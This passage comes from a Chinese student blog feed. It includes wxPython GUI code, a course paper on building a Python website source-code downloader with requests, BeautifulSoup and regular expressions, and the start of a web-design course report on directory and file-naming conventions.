punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Wxpython"><a href="#Wxpython" class="headerlink" title="Wxpython"></a>Wxpython</h2><blockquote><p>Wxpython这个是我最后采用的gui库，倒不是因为有多大去别，主要是我找到了一个自动生成Wxpython的代码段的小程序，我最后选择了wxpython。</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:utf-8 -*-</span><span class="token keyword">import</span> wx<span class="token punctuation">.</span>lib<span class="token punctuation">.</span>agw<span class="token punctuation">.</span>hyperlink <span class="token keyword">as</span> lib_hyperlink<span class="token keyword">import</span> wx<span class="token keyword">class</span> <span class="token class-name">Frame</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>Frame<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        wx<span class="token punctuation">.</span>Frame<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> title<span class="token operator">=</span><span class="token string">'网站源代码下载器'</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">800</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'frame'</span><span class="token punctuation">,</span>style<span class="token operator">=</span><span class="token number">541072384</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>qdck <span class="token operator">=</span> wx<span class="token punctuation">.</span>Panel<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>Centre<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">350</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">)</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'下载'</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'button'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1<span class="token punctuation">.</span>SetAuthNeeded<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1<span class="token punctuation">.</span>Bind<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>EVT_BUTTON<span class="token punctuation">,</span>self<span class="token punctuation">.</span>an1_anbdj<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bjk1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>TextCtrl<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">)</span><span class="token punctuation">,</span>value<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'text'</span><span class="token punctuation">,</span>style<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bjk1<span class="token punctuation">.</span>SetMaxLength<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bq1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>StaticText<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">365</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">235</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'请输入需要下载的链接'</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'staticText'</span><span class="token punctuation">,</span>style<span class="token operator">=</span><span class="token number">2321</span><span class="token punctuation">)</span>        bq1_字体 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Font<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">74</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">700</span><span class="token punctuation">,</span><span class="token boolean">False</span><span class="token punctuation">,</span><span class="token string">'Microsoft YaHei UI'</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bq1<span class="token punctuation">.</span>SetFont<span class="token punctuation">(</span>bq1_字体<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1 <span class="token operator">=</span> lib_hyperlink<span class="token punctuation">.</span>HyperLinkCtrl<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">380</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'staticText'</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'使用说明'</span><span class="token punctuation">,</span>URL<span class="token operator">=</span><span class="token string">'https://im-so-scared-2.gitee.io/shier_jinghuang/'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetToolTip<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>ToolTip<span class="token punctuation">(</span><span class="token string">'使用说明'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        cjljkL1_字体 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Font<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">,</span><span class="token string">'Microsoft YaHei UI'</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetFont<span class="token punctuation">(</span>cjljkL1_字体<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetForegroundColour<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">an1_anbdj</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">#print('an1,按钮被单击')</span>        <span class="token keyword">pass</span><span class="token keyword">class</span> <span class="token class-name">myApp</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>App<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span>  <span class="token function">OnInit</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>frame <span class="token operator">=</span> Frame<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>frame<span class="token punctuation">.</span>Show<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app <span class="token operator">=</span> myApp<span class="token punctuation">(</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>MainLoop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> tkinter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>课程论文-源代码下载器的设计实现</title>
      <link href="/2022/07/05/%E8%AF%BE%E7%A8%8B%E8%AE%BA%E6%96%87-%E6%BA%90%E4%BB%A3%E7%A0%81%E4%B8%8B%E8%BD%BD%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/"/>
      <url>/2022/07/05/%E8%AF%BE%E7%A8%8B%E8%AE%BA%E6%96%87-%E6%BA%90%E4%BB%A3%E7%A0%81%E4%B8%8B%E8%BD%BD%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1><center>网站源代码下载器的设计与实现</center></h1>> **摘要：**随着时代的进步以及科技的发展，人们越来越多的需要高效地从互联网上获取所需的信息，然而其对网络的要求和一些站点人为的限制，却也制约了用户对网络信息的获取和保存。对此，针对于一项可以实现将网站数据便捷获取并长期保存的网站源代码下载器进行了学习研究设计开发，主要应用了爬虫技术通过伪装成客户端与服务器进行数据交互，实现数据采集。可视化网站源代码下载器将实现对用户输入站点的下载实现长期保存，便于用户访问。<p><strong>关键词：</strong> <code>计算机网络</code>   <code>网络爬虫</code>   <code>WxPython正则表达式</code>   <code>requests</code></p><h3 id="1-HTTP协议"><a href="#1-HTTP协议" class="headerlink" title="1.HTTP协议"></a>1.HTTP协议</h3><p>HTTP 报文是在应用程序之间发送的数据块,这些数据块将通过以文本形式的元信息开头，用于 HTTP 协议交互。请求端(客户端)的 HTTP 报文叫做请求报文，响应端(服务器端)的叫做响应报文。 HTTP 报文本身是由多行(用 CR+LF 作换行符)数据构成的字符串文本。（图1.1 Http报文格式）</p><img src="D:\blog\shierjinghuang\source\_posts\课程论文-源代码下载器的设计实现\Http报文格式.png" style="zoom:150%;" /><center>图1.1 Http报文格式</center>### 2.网络爬虫<p>网络爬虫就是自动从互联网中定向或者不定项的采集信息的一种程序。网络爬虫通过伪装成客户端与服务器进行数据交互的，从而实现数据采集，搜索引擎，模拟操作等功能（图2.1 网络爬虫知识图谱）。网络爬虫大致可分为三大模块即，发送请求获取数据，解析数据与获取数据。</p><p>爬虫的第一个步骤是获取数据，就是对起始 URL 发送请求，以获取其返回的响应，值得注意的是，发送请求实质上是指发送请求报文的过程。其报文头部的内容广泛使用于反爬虫策略与抗反爬虫策略。</p><p>数据下载是数据爬取过程中的重要环节。执行数据下载之前首先需要对数据爬取对象网站进行全面地了解，包括此网站数据展示介质、网站背景、网站的组织结构及今后的发展等，在对爬取对象可能出现的展示形式（Web、PC 端应用、APP）进行分析后，才能确定要爬取的具体展现形式[5]</p><p>一个完整的爬虫应用不光涉及网络技术，在获取并下载数据后，还需要对数据进行分析，提取需要的信息，并对数据进行可视化分析和展示。</p><img src="D:\blog\shierjinghuang\source\_posts\课程论文-源代码下载器的设计实现\网络爬虫知识图谱.png"  /><center>图2.1 网络爬虫知识图谱</center>#### 2.1 requests<p>requests库是基于<code>urllib</code>库，采用<code>Apache2 Licensed </code>开源协议编写的，基于其内置的urllib3，其允许程序发送HTTP/1.1请求，且不需要手动的为URL添加查询字串，也不需要对<strong>POST</strong>数据进行表单编码，可以轻易的向对应的网站发起请求，从而对网页数据进行获取，还可以获取服务器返回的响应内容和状态码。</p><h4 id="2-2-正则表达式"><a href="#2-2-正则表达式" class="headerlink" title="2.2 正则表达式"></a>2.2 正则表达式</h4><p>正则表达式是使用单个字符串来描述、匹配一系列符合某个句法规则的字符串，是一种匹配字符串的方法，通过一些特殊符号，实现快速查找、删除、替换某个特定字符串。正则表达式一般用于脚本编程与文本编辑器中，在本程序中通过python re库正则表达式匹配方法，实现对正确输入文本的匹配及对部分内容的批量替换。</p><h4 id="2-3-WxPython"><a href="#2-3-WxPython" class="headerlink" title="2.3 WxPython"></a>2.3 WxPython</h4><p>WxPython是一个开发桌面端图形界面的跨平台函数库，开发语言为Python，它是基于C++的函数库wxWidgets的封装的跨平台GUI工具。</p><h4 id="2-4-Beautiful-Soup"><a href="#2-4-Beautiful-Soup" class="headerlink" title="2.4 Beautiful Soup"></a>2.4 Beautiful Soup</h4><p>Beautiful Soup就是Python的一个HTML或XML的解析库，提供一些简单的、Python式的函数来处理导航、搜索、修改分析树等功能，主要用于将HTML标签转换为Python对象树，并通过解析文档为用户提供需要抓取的数据。</p><h4 id="2-5-抗反爬虫策略"><a href="#2-5-抗反爬虫策略" class="headerlink" title="2.5 抗反爬虫策略"></a>2.5 抗反爬虫策略</h4><p>随着反爬虫程序被研发利用来，越多的网站都有自己的反爬机制，抓取数据已经不像以前那么容易。</p><p>目前，大部分网站都希望正常的用户进行访问，不希望爬虫轻易抓取他们的网站。究其原因，爬虫一方面会给他们的网站带来无用的性能压力，另一方面爬虫会造成他们网站的数据被“盗取”，于是，这些网站开始制定相应的反爬虫策略。一般的反爬策略例如：设置单个IP在单位时间内不能请求次数超过阈值或者请求的频率高于他们认为的人为行为频率、请求参数中带有他们加密后的字段值等。</p><p>要解决网站反爬的问题，首先要知道自己被封的原因和对方的“封堵机制”，这样才能更有效地使用上面的措施解决问题。针对单个IP单位时间内不能请求超过阈值情况，我们需要更改自己的抗反爬策略，一般情况下可以使用User-Agent池、降低下载频率、使用代理IP池等方式解决 ；针对数据加密的情况，可以通过反编译进行解决。</p><h4 id="2-6-关于网络爬虫的法律问题"><a href="#2-6-关于网络爬虫的法律问题" class="headerlink" title="2.6 关于网络爬虫的法律问题"></a>2.6 关于网络爬虫的法律问题</h4><p>遵守Robots协议，此协议声明那些内容不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。 </p><p>不能造成对方服务器瘫痪，2021年颁布实施的《数据安全管理办法》规定网络运营者采取自动化手段访问收集网站数据，不得妨碍网站正常运行[5]</p><p>不能非法获利，不能涉及个人隐私采集的信息，属于公民个人信息的，有可能构成非法获取公民个人信息的违法行为，情节严重的，有可能构成“侵犯公民个人信息罪”因此爬虫开发者的道德和良知才是避免触碰法律底线的根本所在。</p><h3 id="3-设计方法及思路"><a href="#3-设计方法及思路" class="headerlink" title="3. 设计方法及思路"></a><strong>3.</strong> 设计方法及思路</h3><h4 id="3-1-问题分析"><a href="#3-1-问题分析" class="headerlink" title="3.1 问题分析"></a>3.1 问题分析</h4><p>网站源代码下载器这一程序设计的关键在于如何使用户更加便利的保存网络站点上的信息，实现在无互联网的情况下的长期保存。程序将在完成，发送请求获取数据，解析数据与获取数据这三大基本功能的前提下，实现将网页原始数据的加工处理。</p><img src="D:\blog\shierjinghuang\source\_posts\课程论文-源代码下载器的设计实现\流程图.png"  /><h4 id="3-2-设计思路"><a href="#3-2-设计思路" class="headerlink" title="3.2 设计思路"></a>3.2 设计思路</h4><p>基于网络爬虫下实现网站源代码下载器的设计开发，在针对大量网站进行研究后，总结部分结论，不同类型站点网页设计人员对项目设计的方式差异性明显，部分站点可能因为开发时间和后期的修改，呈现出十分混乱的特点，这些都增加了网站源代码下载器的设计难度。针对以上特点，对网站源代码下载器的功能进行设计，利用正则匹配等方式尽可能保留站点原始样貌。</p><p>对于程序设计采用python语言，建立两大模块，即可视化客户端与网络爬虫程序，本项目的网络爬虫程序接近于聚焦网络爬虫，聚焦到特定主题目标网站进行爬取，包含页面爬取模块、无关链接过滤等功能。再对爬取到的信息进行提取和分析，最终能够运行实现网站源码下载器的开发。</p><h3 id="4-具体代码设计及运行"><a href="#4-具体代码设计及运行" class="headerlink" title="4. 具体代码设计及运行"></a>4. 具体代码设计及运行</h3><p>设置一个class类Frame，使用WxPython库的方法实现可视化程序的实现并提供后台接口（如图3.1 网络源代码下载器），通过输入事件监听与正则表达式对用户输入数据进行分析。在输入内容符合要求时通过后台网络爬虫，之后进行数据采集。实现网站源代码下载器的应用。（如图3.2 网站源码下载反馈）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">an1_anbdj</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> event<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>url <span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        toastone <span class="token operator">=</span> wx<span class="token punctuation">.</span>MessageDialog<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">"网站地址不能为空!"</span><span class="token punctuation">,</span> <span class="token string">"错误信息提示"</span><span class="token punctuation">,</span> wx<span class="token punctuation">.</span>YES_DEFAULT <span class="token operator">|</span> wx<span class="token punctuation">.</span>ICON_QUESTION<span class="token punctuation">)</span>        <span class="token keyword">if</span> toastone<span class="token punctuation">.</span>ShowModal<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> wx<span class="token punctuation">.</span>ID_YES<span class="token punctuation">:</span>            <span class="token comment"># 如果点击了提示框的确定按钮</span>            toastone<span class="token punctuation">.</span>Destroy<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment"># 则关闭提示框</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        match<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'(https?|ftp|file)://[-A-Za-z0-9+&amp;@#/%?=~_|!:,.;]+[-A-Za-z0-9+&amp;@#/%=~_|]'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>url<span class="token punctuation">)</span>        <span class="token keyword">if</span> match<span class="token punctuation">:</span>            download_img<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="D:\blog\shierjinghuang\source\_posts\课程论文-源代码下载器的设计实现\网络源代码下载器.png"  /><center>图4.1 网络源代码下载器</center>后台程序接收到可执行的信息后，对信息做出后续处理。对网页内各种资源标签进行匹配，将网页数据（如图片，CSS文件，JS文件）保存至本地，并将其转为相对路径，便于用户直接使用。（如图4.2 本地存储文件、图4.3 本地网页展示）<img src="D:\blog\shierjinghuang\source\_posts\课程论文-源代码下载器的设计实现\本地存储文件.png"  /><center>图4.2 本地存储文件</center><img src="D:\blog\shierjinghuang\source\_posts\课程论文-源代码下载器的设计实现\本地网页展示.png" style="zoom: 150%;" /><center>图4.3 本地网页展示</center>在程序的后台处理中依次实现了，发送请求获取数据，解析数据与获取数据请求获取数据，并对其进行解析：<pre class="line-numbers language-python" data-language="python"><code class="language-python">host <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">u'[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;(\.[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;)+\.?'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>url<span class="token punctuation">)</span>Host <span class="token operator">=</span> <span class="token string">'https://'</span><span class="token operator">+</span> host<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>a <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>a<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">"utf-8"</span>bsobj <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>a<span class="token punctuation">.</span>content<span class="token punctuation">,</span> <span class="token string">'lxml'</span><span class="token punctuation">)</span> <span class="token comment"># 将网页源码构造成BeautifulSoup对象，方便操作</span>a_list <span class="token operator">=</span> bsobj<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>  <span class="token comment"># 获取网页中的所有a标签对象</span>script_list <span class="token operator">=</span> bsobj<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token comment"># 获取网页中所有的script标签</span>link_list <span class="token operator">=</span> bsobj<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'link'</span><span class="token punctuation">)</span><span class="token comment"># 获取网页中所有的link标签</span>img_list <span class="token operator">=</span> bsobj<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对获取到的数据在运行空间暂存，程序对其进行分析，生成标准URL，再次转入数据获取函数，在数据获取完成后，对文件进行格式化保存，将通过数据解析的数据，以其在服务器的相对位置进行存储。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">save_file</span><span class="token punctuation">(</span>chdir_path<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> filename<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'.jpg'</span><span class="token punctuation">,</span> <span class="token string">'.png'</span><span class="token punctuation">,</span> <span class="token string">'webp'</span><span class="token punctuation">,</span><span class="token string">'.png'</span><span class="token punctuation">,</span><span class="token string">'jpeg'</span><span class="token punctuation">,</span> <span class="token string">'.gif'</span><span class="token punctuation">,</span> <span class="token string">'.bmp'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>chdir_path <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> <span class="token string">'images/'</span> <span class="token operator">+</span> filename <span class="token punctuation">,</span> <span class="token string">"wb+"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>    <span class="token keyword">elif</span> filename<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'js'</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>chdir_path <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> <span class="token string">'js/'</span> <span class="token operator">+</span> filename<span class="token punctuation">,</span> <span class="token string">'w+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>    <span class="token keyword">elif</span> filename<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'css'</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>chdir_path <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> <span class="token string">'css/'</span> <span class="token operator">+</span> filename<span class="token punctuation">,</span> <span class="token string">'w+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>chdir_path <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> filename<span class="token punctuation">,</span> <span class="token string">'w+'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为便于用户后期的直接长期阅读，程序后台还通过re模块通过正则匹配将原程序Html文件及CSS中超链接路径匹配为相应的相对路径。</p><h3 id="5．总结"><a href="#5．总结" class="headerlink" title="5．总结"></a>5．总结</h3><p>本文使用Python程序设计软件设计开发了简单的源代码下载器，利用WxPython的有关知识，建立了可视化端口，为爬虫程序提供可用接口，基于网络爬虫的原理下，成功的设计出了程序，实现了网站源码下载器的开发。并且在正则表达式的支持下，将网页原始路径转化为相对路径，不会出现因防盗链和文件路径的不准确或者丢失的情况出现。实现了在没有互联网的情况之下数据的长期保存。</p><h3 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h3><p>[1] 朱荣.《python与大数据分析应用》.清华大学出版社.2021.3.P101-P107</p><p>[2] 谢希仁.《计算机网络》.电子工业出版社.2013.6.P35-P37、P115-P124、P238-P241</p><p>[3] 吴海燕,佟秋利《我国网络安全法律法规体系框架》.中国教育网络.2021.08 P66-P67</p><p>[4] 2021 Bad Bot Report [EB/OL]. <a href="https://www.imperva.com/resources/reports/Bad-Bot-Report">https://www.imperva.com/resources/reports/Bad-Bot-Report</a> 2021</p><p>[5] 孟宝灿,《Python网络爬虫应用探讨》广播电视信息 2022.03 P108-P110</p>]]></content>
      
      
      <categories>
          
          <category> 项目设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 课程论文 </tag>
            
            <tag> Python爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022年Web程序设计大作业与课程论文</title>
      <link href="/2022/07/03/Web%E5%A4%A7%E4%BD%9C%E4%B8%9A/"/>
      <url>/2022/07/03/Web%E5%A4%A7%E4%BD%9C%E4%B8%9A/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写这个主要是我们，那个Web前段开发设计的课采用的是大作业的方式，正好今天我期末结束，任务基本完工，整理下今年做的一些东西。</p></blockquote><h2 id="绿动出行企业门户的设计与实现"><a href="#绿动出行企业门户的设计与实现" class="headerlink" title="绿动出行企业门户的设计与实现"></a>绿动出行企业门户的设计与实现</h2><p>[TOC]</p><h3 id="1-网站相关知识"><a href="#1-网站相关知识" class="headerlink" title="1.网站相关知识"></a>1.网站相关知识</h3><h4 id="1-1目录结构规范、各种标识符命名规范"><a href="#1-1目录结构规范、各种标识符命名规范" class="headerlink" title="1.1目录结构规范、各种标识符命名规范"></a>1.1目录结构规范、各种标识符命名规范</h4><p>建立一个好的前端应该具有一个好的目录结构，每个前端项目总是包含库、jQuery插件和大量的JavaScript脚本与CSS文件，以达到不同的目的和目标。我们需要将所有东西通过遵循一种模式或公约置入文件夹中，以此来保持清晰、整洁。这对我们而言是非常重要的</p><ol><li>整洁的结构：<ul><li>CSS（主文件夹）这个文件夹包含了所有CSS文件。例如index.css可以对应控制index.html文件</li><li>image/img 存放所有的图片文件：.png、.jpg、.jpeg、壁纸等。</li><li>JS (主文件夹) 存放.js文件 </li><li>media 存放多媒体文件  一般指视频与音频文件，在部分情况下可以分为多个媒体文件夹。</li></ul></li></ol><h4 id="1-2文件名命名规范"><a href="#1-2文件名命名规范" class="headerlink" title="1.2文件名命名规范"></a>1.2文件名命名规范</h4><p>文件名称统一用小写的英文字母、数字和下划线的组合，其中不得包含汉字、空格和特殊字符；命名原则的指导思想一是使得每一个成员能够方便的理解每一个文件的意义，二是当我们在文件夹中使用“按名称排例”的命令时，同一种大类的文件能够排列在一起，以便我们查找、修改、替换、计算负载量等等操作。</p><p>引文件统一使用index.htm index.html index.asp文件名（小写） 各子页命名的原则首先应该以栏目名的英语翻译取单一单词为名称例如本系统中已经完成的login.html（登录页面）,about.html(关于我们)</p><h4 id="1-3-HTML结构"><a href="#1-3-HTML结构" class="headerlink" title="1.3 HTML结构"></a>1.3 HTML结构</h4><p>HTML的全称为超文本标记语言，是一种标记语言。它包括一系列标签．通过这些标签可以将网络上的<a href="https://baike.baidu.com/item/%E6%96%87%E6%A1%A3/1009768">文档</a>格式统一，使分散的Internet资源连接为一个逻辑整体。HTML文本是由HTML命令组成的描述性<a href="https://baike.baidu.com/item/%E6%96%87%E6%9C%AC/5443630">文本</a>，HTML命令可以说明文字，图形、动画、声音、表格、链接等。</p><p>一、常见HTML元素</p><ol><li>盒子模型<ul><li>块级标签：<code>&lt;p&gt;/&lt;h1&gt;/&lt;table&gt;/&lt;ol&gt;/&lt;ul&gt;/&lt;form&gt;/&lt;div&gt;</code></li><li>内联标签：<code>&lt;a&gt;/&lt;input/&gt;/&lt;img/&gt;/&lt;sub&gt;/&lt;sup&gt;/&lt;textarea&gt;/&lt;span&gt;</code></li></ul></li><li>特殊字符：&lt;&gt; 